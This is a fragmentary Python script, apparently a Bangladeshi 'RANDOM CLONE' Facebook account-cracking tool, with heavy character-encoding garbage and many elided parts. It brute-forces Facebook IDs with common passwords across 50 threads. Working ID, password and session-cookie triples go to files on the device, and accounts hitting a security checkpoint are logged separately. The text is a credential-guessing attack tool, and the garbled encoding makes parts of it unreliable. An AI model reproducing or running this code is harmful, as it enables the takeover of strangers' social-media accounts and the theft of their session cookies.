...
try:
    ...
    exit()
def banner():
    print("[=] Ã°Å¸ËœÅ’ Testing New mathod By yousuf")
...
\033[1;31m[\033[1;32m�\033[1;31m]\033[1;32m AUTHOR    : MRX JIBON { JIBON SARKAR }            
\033[1;31m[\033[1;32m�\033[1;31m]\033[1;32m FACEBOOK  : Jibon Sarkar            
\033[1;31m[\033[1;32m�\033[1;31m]\033[1;32m GITHUB    : MRX-JIBON-SARKAR              
\033[1;31m[\033[1;32m�\033[1;31m]\033[1;32m TOOL      : RANDOM CLONE  : VERSION : \033[1;97m\033[1;45m0.47\033[1;0m\033[1;97m\033[38;5;46m            
\033[1;31m[\033[1;32m�\033[1;31m]\033[1;32m\033[1;31m[\033[1;32m�\033[1;31m]\033[1;32m""")
def Main():
	os.system('clear')
	print(logo)
	...
	#print("\033[97;1m  â¥ 4 â€£  ð‚ð¨ð§ð­ð«ðšðœð­ ð€ðð¦ð¢ð§ ")
	#print('\033[97;1m  â¥ 5 â€£  ððšðœð¤')
	
	opt = input('[\033[1;32m✓\033[1;37m] Choice : ')
	if opt =='1':
		mathod1()
	if opt =='2':
		mathod2()
...
def mathod1():
	...
	doamin = ' ððƒ ðð®ð¦ð›ðžð« ðœð¥ð¨ð§ðžð« '
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+kode+'bangladesh','i love you','113355','22334455','121235','@@@###']
			yaari.submit(a,uid,pwx,tl)
	print(47*'\033[1;31m\033[1;37m')
	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mâŸ©\033[1;37m] /sdcard/FOFâ€¢RANDOMâ€¢OK.txt')
	print(47*'\033[1;31m\033[1;37m')
	exit()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            ...
            sys.stdout.write(f'\r [MRX-M1] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\33[1;91m[FOF CP] {uid} | {ps}")
                open('/sdcard/R FOF CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[ð“ð€ð’ðˆð] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}ð“ð€ð’ðˆð{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â{P}[{H}{ok}{P}]ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â{P}[{k}{cp}{x}]ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def m2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            session = requests.Session()
            sys.stdout.write(f'\r [MRX-M2] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MRX-OK-M2.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\33[1;91m[MRX-CP] {uid} | {ps}")
                open('/sdcard/R MRX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
